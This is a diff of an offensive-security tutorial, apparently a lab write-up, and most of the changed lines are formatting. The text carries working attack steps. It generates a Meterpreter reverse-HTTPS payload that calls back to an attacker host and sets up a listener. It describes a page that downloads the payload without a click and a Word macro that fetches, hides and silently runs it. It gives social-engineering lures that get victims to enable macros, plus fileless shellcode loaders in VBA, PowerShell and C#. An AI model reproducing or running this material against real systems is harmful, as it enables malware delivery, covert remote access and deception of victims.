@@ -1,14 +1,10 @@
-<div style="background-color: #000000;color: #ffffff;padding: 20px;border-radius: 10px;margin: 20px 0;font-family: 'Courier New', monospace;">
-
-
-<b><h1>Scenario 1</h1>
+<b><h2>Scenario 1</h2>
 - Kali = 192.168.2.3<br>
 - Windows = 192.168.2.5<br>
-</div>
 <h2>Practical explanation<br>
 1 ------ Payload Creation<br></h2>
-$ Msfvenom-p windows/meterpreter/reverse_https LHOST 192.168.2.3 LPORT 443 -f exe -o /var/www/html/msfstaged.exe <br>
-<h2>2 ------ Listener Setup<br></h2>
+$ Msfvenom-p windows/meterpreter/reverse_https LHOST 192.168.2.3 LPORT 443 -f exe -o /var/www/html/msfstaged.exe 
+<h2>2 ------ Listener Setup</h2>
 $ Sudo msfconsole <br>
 msf6 > ues exploit/multi/handler<br>
 msf6(....) > set payload windows/meterpreter/reverse_https <br>
@@ -58,11 +54,13 @@ window.URL.revokeObjectURL(url);
 1 ------<br></h2>
 💡The clear purpose of the code is:<br> 
 when someone visits a page like http://192.168.2.3/download.html, a file (e.g., shellcode in .exe format) is automatically downloaded without user interaction (i.e., without needing to click a button).<br>
-                 <h3>....................</h3><br>
-<h2>Scenario 2<br>
-1 ------ Malicious Macro Script</h2>
 
-````csharp
+---
+
+<h2>Scenario 2<br>
+1 ------ Malicious Macro Script<br></h2>
+    
+````
 Sub Document_Open()
     Ahmed
 End Sub
@@ -101,20 +99,22 @@ End Sub
 Victim's machine 
 http://192.168.2.3/download.html
 <br>
-        <h2>Exploitation Tutorial<br>
-1 ------</h2>
+<h2>Exploitation Tutorial<br>
+1 ------<br></h2>
 1. Command: The command first downloads the program (the file msfstaged.exe) from the specified URL to the local path defined in the exepath variable. The downloaded file is saved as msfstaged.exe.<br>
 2. exepath: After the file is downloaded, the Shell exepath, vbHide command runs the saved file (msfstaged.exe), effectively executing it.<br>
 3. hideCmd: is used to hide the file located at the path specified in exepath.<br>
 4. Wait 4:  pauses the execution of the program for 4 seconds to allow enough time for the file to fully download before attempting to run it.<br>
 <br>
 💡After downloading the file, it is executed using PowerShell by referencing the full path of the file stored in the exepath variable.<br>
-<br>
-<h2>Summary:<br></h2>
+
+<h3>Summary:</h3>
 1. When the Word document is opened, the VBA code starts by downloading the executable file msfstaged.exe from a specified URL to the same folder as the document.<br>
 2. The program then pauses for 4 seconds to ensure the file has been fully downloaded.<br>
 3. After that, the file is hidden using the attrib +h command and executed silently using the Shell function.<br>
-                 <h2>....................<br></h2>
+
+---
+
 <h2>Scenario 3<br>
 1 ------Disguised Macro Script<br></h2>
 
@@ -133,7 +133,7 @@ Sub MyMacro()
     ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoC").Insert Where:=Selection.Range, RichText:=True
 End Sub
 ````
-<h2>2 ------Social Engineering Technique</h2><br>
+<h2>2 ------Social Engineering Technique</h2>
 For example, you create a Word file that contains malware embedded in the macro to establish a reverse connection. Then you send the Word file to the victim, but the victim must click "Enable Macros" for the code to execute.<br>
 <br>
 💡To convince the victim, you insert random or encrypted-looking text into the document along with a message like:
@@ -141,31 +141,29 @@ For example, you create a Word file that contains malware embedded in the macro 
 ● This document is protected. Please enable macros to view the content."<br>
 or<br>
 ● Content is encrypted. Click 'Enable Content' to decrypt."<br>
-<br>
-This makes it seem like the content is hidden and needs to be "unlocked."<br>
-<br>
-Then, you use a macro that deletes the meaningless content and replaces it with normal, readable text once macros are enabled — so the victim doesn't suspect anything unusual.<br>
-.......<br>
-💡Important Note:<br>
+→This makes it seem like the content is hidden and needs to be "unlocked."<br>
+→Then, you use a macro that deletes the meaningless content and replaces it with normal, readable text once macros are enabled — so the victim doesn't suspect anything unusual.<br>
+
+<h3>💡Important Note:</h3>
 > When you want to call an object, you need to use a method like WScript.CreateObject or New-Object -ComObject to interact with it inside the script, whether you're using VBScript or PowerShell.<br>
 💡This acts like a "gateway" that gives you access to the objects inside the system.<br>
-                 ....................<br>
-                 ....................<br>
+
+---
+
+---
+
 <h1 align="center">Fileless malware</h1>
 Fileless malware is a type of malicious software that doesn't get stored as a file on the disk. Instead, it operates directly in memory (RAM), making it harder for traditional antivirus programs to detect.<br>
-                           ....................<br>
-<h2>Fileless malware with VBA<br></h2>
-<h2>Practical explanation<br>  
-1 ------</h2><br>
+
+<h2>Fileless malware with VBA Practical<br>
+1 ------</h2>
 $ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443 
 EXITFUNC=thread -f vbapplication -o /mnt/share/vbapplication.txt<br>  
-<h2>2 ------</h2><br>  
+<h2>2 ------</h2>  
 $ cd /mnt/share <br>  
-<br>  
 $ mousepad vbapplication.txt<br>   
-<br>  
-Take all the contents of the file and place them in the code ⬇️.<br>  
-<h2>3 ------</h2><br>  
+then Take all the contents of the file and place them in the code ↓.<br>  
+<h2>3 ------</h2>
 
 ````
 Private Declare Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef Threadid As Long) As Long
@@ -200,7 +198,7 @@ Sub AutoOpen()
 End Sub
 ````````
 <h2>Exploitation Tutorial<br>  
-1 ------<br></h2>
+1 ------</h2>
 This code relies on three different Windows API functions, which are:<br>
 <br>
 1. VirtualAlloc<br>
@@ -217,19 +215,19 @@ Creates a new thread that starts execution from the specified memory address —
                            ....................<br>
 💡You can shorten this code using msfvenom from Metasploit by generating a payload in the VBA format instead of vbapplication.<br>
 This format can be used to embed the malicious code inside a Word document (for example) through a VBA macro, allowing the code to execute automatically when the macro is enabled.<br>
-                           ....................
-                           ....................
-<h2>Fileless malware with PowerShell</h2><br> 
-<h2>Practical explanation<br>   
-1 ------Payload Generation</h2><br>
+
+---
+
+<h2>Fileless malware with PowerShell Practical<br> 
+1 ------Payload Generation</h2>
 $ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
 EXITFUNC=thread -f ps1 -o /mnt/share/ps1.txt<br>
-<h2>2 ------Shellcode Extraction</h2><br>
+<h2>2 ------Shellcode Extraction</h2>
 $ cd /mnt/share <br>
 $ mousepad ps1.txt<br>
 <br>
-Take all the contents of the file and place them in the code ⬇️.<br>
-<h2>3 ------Fileless VBA Execution</h2><br>
+Take all the contents of the file and place them in the code ↓.<br>
+<h2>3 ------Fileless VBA Execution</h2>
 
 ````
 $Kerne132 = @"
@@ -260,7 +258,7 @@ $thandle=[Kernel32]::CreateThread(0,0, $addr,0,0,0);
 [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
  ````
 <h2>Exploitation Tutorial<br>
-1 ------</h2><br>
+1 ------</h2>
 This code relies on three different Windows API functions, which are:<br>
 <br>
 1. VirtualAlloc<br>
@@ -274,19 +272,19 @@ Copies the shellcode (or any byte array) into the allocated memory space using .
 3. CreateThread<br>
 Purpose:<br>
 Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
-                           ....................<br>
-                           ....................<br>
-<h2>Fileless malware with csharp C#</h2><br>
-<h2>Practical explanation<br>   
-1 ------Payload Generation</h2><br>
+
+---
+
+<h2>Fileless malware with csharp Practical<br>
+1 ------Payload Generation</h2>
 $ Msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.2.3 LPORT=443
 EXITFUNC=thread -f csharp -o /mnt/share/csharp.txt<br>
-<h2>2 ------Shellcode Extraction</h2><br>
+<h2>2 ------Shellcode Extraction</h2>
 $ cd /mnt/share <br>
 $ mousepad csharp.txt<br>
 <br>
-Take all the contents of the file and place them in the code ⬇️.<br>
-<h2>3 ------Fileless C# Execution</h2><br>
+Take all the contents of the file and place them in the code ↓.<br>
+<h2>3 ------Fileless C# Execution</h2>
 
 ````
 using System;
@@ -323,7 +321,7 @@ namespace ConsoleApp1
 }
 ````
 <h2>Exploitation Tutorial<br>
-1 ------</h2><br>
+1 ------</h2>
 This code relies on three different Windows API functions, which are:<br>
 <br>
 1. VirtualAlloc<br>
@@ -337,8 +335,9 @@ Copies the shellcode (or any byte array) into the allocated memory space using .
 3. CreateThread<br>
 Purpose:<br>
 Creates a new thread that starts execution from the specified memory address — in this case, where the shellcode was placed.<br>
-                 ....................<br>
-                 ....................<br>
+
+---
+
 <h1 align="center">API</h1><br>        
 <h2>VirtualAlloc</h2><br>  
 The VirtualAlloc function in Windows is used to allocate memory within a process. It takes four main parameters:<br>  
